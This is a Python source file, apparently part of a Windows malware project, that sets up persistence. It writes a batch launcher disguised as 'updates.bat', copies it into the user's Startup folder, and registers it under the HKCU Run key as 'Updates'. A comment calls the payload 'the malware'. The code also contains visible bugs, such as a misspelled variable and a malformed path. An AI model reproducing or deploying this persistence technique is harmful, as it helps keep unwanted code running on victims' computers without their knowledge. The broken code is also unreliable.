import os
import shutil
import winreg
import os
from func import generate_random_path

current_user = os.getenv("USERNAME")
cwd = os.getcwd() + "/updates.bat"

def persist():
    __create_lunch_script()
    __create_registry_key()
    __copy_to_startup()


def __create_lunch_script():
    python_path = f"C:/Users/{current_user}/AppData/Local/Programs/Python/Python39/python.exe"
    main_path = f"{cwd}/main.py"

    content = f"@echo off \n{python_path} {main_path} \npause"
    with open("updates.bat", "a+") as f:
        f.write(content)


def __copy_to_startup():
    startup_path = f"C:/Users/{current_usder}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/updates.bat"
    try:
        shutil.copyfile(cwd, startup_path)
    except shutil.SameFileError: # in case file already exists
        pass


def __create_registry_key():
    trigger_path = generate_random_path()
    print(trigger_path)
    shutil.copy(cwd, trigger_path + "updates.bat")

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS) as key:
            winreg.SetValueEx(key, 'Updates', 0, winreg.REG_SZ,
                              trigger_path + "updates.bat")  # <- Should be changed to the malware name
    except OSError:
        pass


